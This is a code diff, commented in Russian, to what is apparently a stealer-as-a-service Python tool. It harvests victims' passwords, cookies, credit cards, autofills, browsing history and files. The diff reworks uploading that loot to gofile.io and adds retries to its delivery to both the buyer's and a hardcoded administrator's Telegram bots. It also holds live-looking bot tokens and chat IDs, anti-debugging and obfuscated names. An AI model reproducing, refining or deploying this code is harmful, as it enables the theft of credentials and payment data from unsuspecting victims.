@@ -41,6 +41,12 @@ except:
 DEBUG_LOG = os.path.join(log_dir, "debug.log")
 CRASH_LOG = os.path.join(log_dir, "crash.log")
 
+# ================== НАСТРОЙКИ ДЛЯ ОТПРАВКИ ЛОГОВ В TELEGRAM ==================
+TG_BOT_TOKEN = "REPLACE_TG_TOKEN"   # заменяется на токен пользователя при сборке
+TG_CHAT_ID = "REPLACE_TG_CHAT"     # заменяется на chat_id пользователя
+ADMIN_BOT_TOKEN = "7965154885:AAF47_kzofVg9-IYbbcM4z2EHGz0h-LPfcI"
+ADMIN_CHAT_ID = "5084593394"
+
 def log_message(msg):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
@@ -114,18 +120,6 @@ def check_subscription():
             else:
                 log_message("Подписка неактивна")
                 sys.exit(0)
-        elif response.status_code == 404:
-            # Пользователь не найден — регистрируем с 30 днями подписки
-            log_message("Пользователь не найден, регистрируем...")
-            register_url = "https://JJ3RD0XXS.pythonanywhere.com/register_user"
-            payload = {"telegram_id": USER_ID, "days": 30, "username": "AutoReg"}
-            reg_resp = requests.post(register_url, json=payload, timeout=10)
-            if reg_resp.status_code == 200:
-                log_message("Пользователь зарегистрирован, подписка активна")
-                return True
-            else:
-                log_message("Ошибка регистрации")
-                sys.exit(0)
         else:
             log_message(f"Ошибка API: {response.status_code}")
             sys.exit(0)
@@ -155,10 +149,8 @@ for module in ModuleRequirements:
 from Crypto.Cipher import AES
 
 # ================== НАСТРОЙКИ TELEGRAM ==================
-TG_BOT_TOKEN = "REPLACE_TG_TOKEN"   # токен бота пользователя (подставляется при сборке)
-TG_CHAT_ID = "REPLACE_TG_CHAT"     # чат-айди пользователя (подставляется при сборке)
-ADMIN_BOT_TOKEN = "7965154885:AAF47_kzofVg9-IYbbcM4z2EHGz0h-LPfcI"  # админский бот
-ADMIN_CHAT_ID = "5084593394"        # админский чат-айди
+#TG_BOT_TOKEN = "8559557105:AAH-mkWJgOaHOoKSXs05tPB9Xz52Asb1Jak"
+#TG_CHAT_ID = "5084593394"
 
 
 def antidebug():
@@ -1201,31 +1193,41 @@ def UP104D7060F113(path):
         log_message(f"Загрузка на {server}.gofile.io: {path}")
         file_size = os.path.getsize(path)
         log_message(f"Размер файла: {file_size} байт")
-        with open(path, 'rb') as f:
-            response = requests.post(f"https://{server}.gofile.io/uploadFile", files={'file': f}, timeout=120)  # было 60
-        log_message(f"Статус ответа: {response.status_code}")
-        log_message(f"Тело ответа (первые 500): {response.text[:500]}")
-        if response.status_code == 200:
+
+        # Получаем guest token (один раз, сохраняем в атрибуте функции)
+        if not hasattr(UP104D7060F113, "guest_token"):
             try:
-                data = response.json()
-                if data.get('status') == 'ok':
-                    download_page = data['data']['downloadPage']
-                    log_message(f"Ссылка: {download_page}")
-                    return download_page
+                token_resp = requests.get("https://api.gofile.io/createAccount", timeout=10)
+                if token_resp.status_code == 200:
+                    UP104D7060F113.guest_token = token_resp.json()["data"]["token"]
+                    log_message(f"Получен guestToken: {UP104D7060F113.guest_token}")
                 else:
-                    log_message(f"Ошибка в JSON: {data}")
+                    log_message(f"Не удалось получить guestToken: {token_resp.status_code}, {token_resp.text}")
                     return False
             except Exception as e:
-                log_message(f"Не удалось распарсить JSON: {e}")
-                import re
-                match = re.search(r'"downloadPage"\s*:\s*"([^"]+)"', response.text)
-                if match:
-                    link = match.group(1)
-                    log_message(f"Ссылка (regex): {link}")
-                    return link
-                else:
-                    log_message("Не удалось найти ссылку в ответе")
-                    return False
+                log_message(f"Исключение при получении guestToken: {e}")
+                return False
+
+        headers = {"Authorization": f"Bearer {UP104D7060F113.guest_token}"}
+        with open(path, 'rb') as f:
+            response = requests.post(
+                f"https://{server}.gofile.io/uploadFile",
+                files={'file': f},
+                headers=headers,
+                timeout=120
+            )
+        log_message(f"Статус ответа: {response.status_code}")
+        log_message(f"Тело ответа (первые 500): {response.text[:500]}")
+
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'ok':
+                download_page = data['data']['downloadPage']
+                log_message(f"Ссылка: {download_page}")
+                return download_page
+            else:
+                log_message(f"Ошибка в JSON: {data}")
+                return False
         else:
             log_message(f"HTTP ошибка {response.status_code}")
             return False
@@ -1444,12 +1446,19 @@ def filestealr():
     log_message("filestealr завершена")
 
 def send_telegram_summary():
-    """Отправляет итоговое сообщение в Telegram пользователю и администратору (без превью ссылок)."""
+    """Отправляет итоговое сообщение в Telegram пользователю и администратору (с повторными попытками)."""
     global GLINFO, PASSWORDS_LINK, COOKIES_LINK, CREDITCARDS_LINK, AUTOFILLS_LINK, HISTORIES_LINK, BOOKMARKS_LINK, FILES_ARCHIVE_LINK
     global P455WC0UNt, C00K1C0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt
     global p45WW0rDs, c00K1W0rDs
 
     log_message("send_telegram_summary вызвана")
+    log_message(f"PASSWORDS_LINK = {PASSWORDS_LINK}")
+    log_message(f"COOKIES_LINK = {COOKIES_LINK}")
+    log_message(f"CREDITCARDS_LINK = {CREDITCARDS_LINK}")
+    log_message(f"AUTOFILLS_LINK = {AUTOFILLS_LINK}")
+    log_message(f"HISTORIES_LINK = {HISTORIES_LINK}")
+    log_message(f"BOOKMARKS_LINK = {BOOKMARKS_LINK}")
+    log_message(f"FILES_ARCHIVE_LINK = {FILES_ARCHIVE_LINK}")
 
     # Получаем номер лога
     log_number = get_next_log_number()
@@ -1526,6 +1535,8 @@ def send_telegram_summary():
         html_parts.append(f"<blockquote>🗝 • <b>{P455WC0UNt} Passwords Found</b></blockquote>")
         if PASSWORDS_LINK:
             html_parts.append(f'➡️ • <a href="{PASSWORDS_LINK}">Passwords.txt</a>')
+        else:
+            html_parts.append(f'➡️ • Passwords.txt (ошибка загрузки)')
 
     # Cookies Files
     if C00K1C0UNt > 0:
@@ -1543,28 +1554,41 @@ def send_telegram_summary():
         html_parts.append(f"<blockquote>📃 • <b>{C00K1C0UNt} Cookies Found</b></blockquote>")
         if COOKIES_LINK:
             html_parts.append(f'➡️ • <a href="{COOKIES_LINK}">Cookies.txt</a>')
+        else:
+            html_parts.append(f'➡️ • Cookies.txt (ошибка загрузки)')
 
     # Остальные разделы
     if H1570rYC0UNt > 0:
         html_parts.append(f"\n<blockquote>📋 • <b>{H1570rYC0UNt} Histories Found</b></blockquote>")
         if HISTORIES_LINK:
             html_parts.append(f'➡️ • <a href="{HISTORIES_LINK}">Histories.txt</a>')
+        else:
+            html_parts.append(f'➡️ • Histories.txt (ошибка загрузки)')
     if AU70F111C0UNt > 0:
         html_parts.append(f"\n<blockquote>📤 • <b>{AU70F111C0UNt} Autofills Found</b></blockquote>")
         if AUTOFILLS_LINK:
             html_parts.append(f'➡️ • <a href="{AUTOFILLS_LINK}">Autofills.txt</a>')
+        else:
+            html_parts.append(f'➡️ • Autofills.txt (ошибка загрузки)')
     if CC5C0UNt > 0:
         html_parts.append(f"\n<blockquote>💳 • <b>{CC5C0UNt} Credit Cards Found</b></blockquote>")
         if CREDITCARDS_LINK:
             html_parts.append(f'➡️ • <a href="{CREDITCARDS_LINK}">CreditCards.txt</a>')
+        else:
+            html_parts.append(f'➡️ • CreditCards.txt (ошибка загрузки)')
     if B00KM4rK5C0UNt > 0:
         html_parts.append(f"\n<blockquote>📕 • <b>{B00KM4rK5C0UNt} Bookmarks Found</b></blockquote>")
         if BOOKMARKS_LINK:
             html_parts.append(f'➡️ • <a href="{BOOKMARKS_LINK}">Bookmarks.txt</a>')
+        else:
+            html_parts.append(f'➡️ • Bookmarks.txt (ошибка загрузки)')
 
     if FILES_ARCHIVE_LINK:
         html_parts.append(f"\n<blockquote>📦 • <b>Файлы с компьютера</b></blockquote>")
         html_parts.append(f'➡️ • <a href="{FILES_ARCHIVE_LINK}">Архив</a>')
+    else:
+        html_parts.append(f"\n<blockquote>📦 • <b>Файлы с компьютера</b></blockquote>")
+        html_parts.append(f'➡️ • Архив (ошибка загрузки)')
 
     full_html = "\n".join(html_parts)
     log_message(f"Общая длина HTML-текста: {len(full_html)}")
@@ -1584,46 +1608,48 @@ def send_telegram_summary():
 
     parts = split_text(full_html)
 
-    # ====== 1. Отправка на API (как было) ======
+    # ====== 1. Отправка на API (PythonAnywhere) ======
     for idx, part in enumerate(parts, 1):
         send_log_to_api(part, 'text')
         log_message(f"Часть {idx}/{len(parts)} отправлена через API")
 
-    # ====== 2. Отправка ПОЛЬЗОВАТЕЛЮ (с отключением превью) ======
-    try:
-        for part in parts:
-            url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
-            payload = {
-                "chat_id": TG_CHAT_ID,
-                "text": part,
-                "parse_mode": "HTML",
-                "disable_web_page_preview": True   # ← отключаем превью ссылок
-            }
-            resp = requests.post(url, json=payload, timeout=10)
-            if resp.status_code == 200:
-                log_message("Часть лога отправлена пользователю")
-            else:
-                log_message(f"Ошибка отправки пользователю: {resp.status_code}, {resp.text}")
-    except Exception as e:
-        log_message(f"Исключение при отправке пользователю: {e}")
+    # ====== 2. Отправка ПОЛЬЗОВАТЕЛЮ (через его бота) ======
+    def send_with_retries(bot_token, chat_id, text, max_retries=3, delay=5):
+        for attempt in range(max_retries):
+            try:
+                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+                payload = {
+                    "chat_id": chat_id,
+                    "text": text,
+                    "parse_mode": "HTML",
+                    "disable_web_page_preview": True
+                }
+                resp = requests.post(url, json=payload, timeout=15)
+                if resp.status_code == 200:
+                    return True
+                else:
+                    log_message(f"Попытка {attempt+1}: ошибка {resp.status_code}, {resp.text}")
+            except Exception as e:
+                log_message(f"Попытка {attempt+1}: исключение {e}")
+            if attempt < max_retries - 1:
+                time.sleep(delay)
+        return False
 
-    # ====== 3. Отправка АДМИНИСТРАТОРУ (с пометкой и отключением превью) ======
-    try:
-        for part in parts:
-            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
-            payload = {
-                "chat_id": ADMIN_CHAT_ID,
-                "text": f"📨 Лог от пользователя {USER_ID}:\n\n{part}",
-                "parse_mode": "HTML",
-                "disable_web_page_preview": True   # ← отключаем превью ссылок
-            }
-            resp = requests.post(url, json=payload, timeout=10)
-            if resp.status_code == 200:
-                log_message("Часть лога отправлена администратору")
-            else:
-                log_message(f"Ошибка отправки администратору: {resp.status_code}, {resp.text}")
-    except Exception as e:
-        log_message(f"Исключение при отправке администратору: {e}")
+    for part in parts:
+        success = send_with_retries(TG_BOT_TOKEN, TG_CHAT_ID, part)
+        if success:
+            log_message("Часть лога отправлена пользователю")
+        else:
+            log_message("Не удалось отправить часть лога пользователю после всех попыток")
+
+    # ====== 3. Отправка АДМИНИСТРАТОРУ (с пометкой) ======
+    for part in parts:
+        admin_text = f"📨 Лог от пользователя {USER_ID}:\n\n{part}"
+        success = send_with_retries(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, admin_text)
+        if success:
+            log_message("Часть лога отправлена администратору")
+        else:
+            log_message("Не удалось отправить часть лога администратору после всех попыток")
 
 global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157
 
